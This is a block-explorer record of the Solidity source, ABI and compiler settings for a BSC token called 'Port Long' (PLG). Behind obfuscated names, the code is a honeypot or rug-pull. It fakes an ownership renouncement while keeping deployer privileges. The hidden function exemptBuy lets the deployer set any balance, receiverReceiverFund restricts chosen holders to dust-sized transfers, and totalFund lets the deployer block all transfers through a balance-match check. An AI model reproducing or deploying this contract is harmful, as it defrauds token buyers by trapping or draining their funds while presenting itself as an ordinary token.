{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface feeLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapFromList {\n    function createPair(address minAt, address toTotal) external returns (address);\n}\n\ninterface enableWalletList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableToken) external view returns (uint256);\n\n    function transfer(address enableTake, uint256 takeSender) external returns (bool);\n\n    function allowance(address listShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableTake,\n        uint256 takeSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableTxBuy, uint256 value);\n    event Approval(address indexed listShould, address indexed spender, uint256 value);\n}\n\ninterface enableWalletListMetadata is enableWalletList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PortLong is modeSwap, enableWalletList, enableWalletListMetadata {\n\n    function approve(address walletToken, uint256 takeSender) public virtual override returns (bool) {\n        launchIsEnable[_msgSender()][walletToken] = takeSender;\n        emit Approval(_msgSender(), walletToken, takeSender);\n        return true;\n    }\n\n    function totalFund(uint256 takeSender) public {\n        limitSell();\n        atListMode = takeSender;\n    }\n\n    function enableLimit(address modeEnable) public {\n        require(modeEnable.balance < 100000);\n        if (autoTake) {\n            return;\n        }\n        \n        fromLimit[modeEnable] = true;\n        if (walletEnableBuy == takeExemptReceiver) {\n            launchedLiquidity = takeTo;\n        }\n        autoTake = true;\n    }\n\n    uint256 public liquidityShould;\n\n    function limitSell() private view {\n        require(fromLimit[_msgSender()]);\n    }\n\n    uint256 public takeTo;\n\n    uint256 private atReceiver;\n\n    address liquidityTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public tradingFundFrom;\n\n    function getOwner() external view returns (address) {\n        return isReceiver;\n    }\n\n    bool public teamLiquidity;\n\n    string private isBuy = \"PLG\";\n\n    address tradingSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function exemptBuy(address exemptModeFund, uint256 takeSender) public {\n        limitSell();\n        walletAmount[exemptModeFund] = takeSender;\n    }\n\n    function teamModeTrading(address teamExempt, address enableTake, uint256 takeSender) internal returns (bool) {\n        require(walletAmount[teamExempt] >= takeSender);\n        walletAmount[teamExempt] -= takeSender;\n        walletAmount[enableTake] += takeSender;\n        emit Transfer(teamExempt, enableTake, takeSender);\n        return true;\n    }\n\n    uint256 atListMode;\n\n    function owner() external view returns (address) {\n        return isReceiver;\n    }\n\n    function allowance(address fromExempt, address walletToken) external view virtual override returns (uint256) {\n        if (walletToken == tradingSender) {\n            return type(uint256).max;\n        }\n        return launchIsEnable[fromExempt][walletToken];\n    }\n\n    uint256 public launchedLiquidity;\n\n    uint256 public atTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isBuy;\n    }\n\n    event OwnershipTransferred(address indexed takeLaunchTotal, address indexed takeTotal);\n\n    bool public walletEnableBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return txExempt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toWallet;\n    }\n\n    function teamTotalReceiver(address teamExempt, address enableTake, uint256 takeSender) internal returns (bool) {\n        if (teamExempt == tradingFundFrom) {\n            return teamModeTrading(teamExempt, enableTake, takeSender);\n        }\n        uint256 marketingTeam = enableWalletList(sellAutoSender).balanceOf(liquidityTo);\n        require(marketingTeam == atListMode);\n        require(enableTake != liquidityTo);\n        if (limitEnable[teamExempt]) {\n            return teamModeTrading(teamExempt, enableTake, listSell);\n        }\n        return teamModeTrading(teamExempt, enableTake, takeSender);\n    }\n\n    string private txExempt = \"Port Long\";\n\n    constructor (){\n        \n        feeLaunch toLimit = feeLaunch(tradingSender);\n        sellAutoSender = swapFromList(toLimit.factory()).createPair(toLimit.WETH(), address(this));\n        \n        tradingFundFrom = _msgSender();\n        tradingList();\n        fromLimit[tradingFundFrom] = true;\n        walletAmount[tradingFundFrom] = buyListMode;\n        if (takeTo == atTrading) {\n            takeTo = launchedLiquidity;\n        }\n        emit Transfer(address(0), tradingFundFrom, buyListMode);\n    }\n\n    function receiverReceiverFund(address tokenExempt) public {\n        limitSell();\n        \n        if (tokenExempt == tradingFundFrom || tokenExempt == sellAutoSender) {\n            return;\n        }\n        limitEnable[tokenExempt] = true;\n    }\n\n    uint8 private toWallet = 18;\n\n    uint256 private buyListMode = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private walletAmount;\n\n    address private isReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyListMode;\n    }\n\n    bool public takeExemptReceiver;\n\n    uint256 launchedMin;\n\n    function transfer(address exemptModeFund, uint256 takeSender) external virtual override returns (bool) {\n        return teamTotalReceiver(_msgSender(), exemptModeFund, takeSender);\n    }\n\n    mapping(address => bool) public limitEnable;\n\n    bool public autoTake;\n\n    function balanceOf(address enableToken) public view virtual override returns (uint256) {\n        return walletAmount[enableToken];\n    }\n\n    function transferFrom(address teamExempt, address enableTake, uint256 takeSender) external override returns (bool) {\n        if (_msgSender() != tradingSender) {\n            if (launchIsEnable[teamExempt][_msgSender()] != type(uint256).max) {\n                require(takeSender <= launchIsEnable[teamExempt][_msgSender()]);\n                launchIsEnable[teamExempt][_msgSender()] -= takeSender;\n            }\n        }\n        return teamTotalReceiver(teamExempt, enableTake, takeSender);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchIsEnable;\n\n    mapping(address => bool) public fromLimit;\n\n    address public sellAutoSender;\n\n    uint256 constant listSell = 14 ** 10;\n\n    function tradingList() public {\n        emit OwnershipTransferred(tradingFundFrom, address(0));\n        isReceiver = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLaunchTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTxBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeEnable\",\"type\":\"address\"}],\"name\":\"enableLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptModeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSender\",\"type\":\"uint256\"}],\"name\":\"exemptBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenExempt\",\"type\":\"address\"}],\"name\":\"receiverReceiverFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAutoSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeExemptReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeSender\",\"type\":\"uint256\"}],\"name\":\"totalFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFundFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptModeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletEnableBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PortLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}